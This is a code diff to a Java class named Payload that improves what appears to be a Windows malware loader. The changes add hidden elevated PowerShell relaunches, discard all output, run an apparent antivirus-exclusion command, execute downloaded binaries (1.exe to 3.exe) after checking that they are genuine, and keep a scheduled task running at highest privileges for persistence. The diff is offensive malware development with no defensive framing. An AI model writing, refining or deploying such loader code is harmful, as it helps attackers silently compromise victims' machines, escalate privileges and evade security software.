@@ -55,11 +55,15 @@ public class Payload {
             lockFile.createNewFile();
 
             String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s' -WindowStyle Hidden",
                 javaExe, jarPath, key, ip
             );
 
-            Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+            ProcessBuilder pb = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand);
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+            
+            Process p = pb.start();
             p.waitFor();
             
             for (int i = 0; i < 100; i++) {
@@ -172,6 +176,8 @@ public class Payload {
                 ProcessBuilder pb = new ProcessBuilder(
                     "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psExclude
                 );
+                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                 pb.start().waitFor();
                 
                 Thread.sleep(3000); 
@@ -185,11 +191,15 @@ public class Payload {
             String[] exesToRun = {"3.exe", "2.exe", "1.exe"};
             for (String exe : exesToRun) {
                 File exeFile = new File(loaderDir, exe);
-                if (exeFile.exists()) {
+                // > 1024 ensures it's a real executable, not a 404 HTML page
+                if (exeFile.exists() && exeFile.length() > 1024) {
                     try {
-                        // Using cmd.exe /c start fixes the CreateProcess error=2 and bypasses some execution blocks
-                        new ProcessBuilder("cmd.exe", "/c", "start", "", exeFile.getAbsolutePath(), key)
-                            .directory(loaderDir).start();
+                        // Exact execution as requested: .\2.exe all
+                        ProcessBuilder pb = new ProcessBuilder(".\\" + exe, "all");
+                        pb.directory(loaderDir);
+                        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+                        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+                        pb.start();
                     } catch (Exception e) {}
                     Thread.sleep(1000);
                 }
@@ -241,7 +251,8 @@ public class Payload {
                 "/RL", "HIGHEST",
                 "/F"
             );
-            
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
             pb.start().waitFor();
         } catch (Exception e) {}
     }
@@ -254,7 +265,6 @@ public class Payload {
             conn.setConnectTimeout(5000);
             conn.setReadTimeout(5000);
 
-            // Check if the download actually succeeded (HTTP 200)
             if (conn.getResponseCode() == 200) {
                 try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
                     byte[] buf = new byte[8192]; int len;
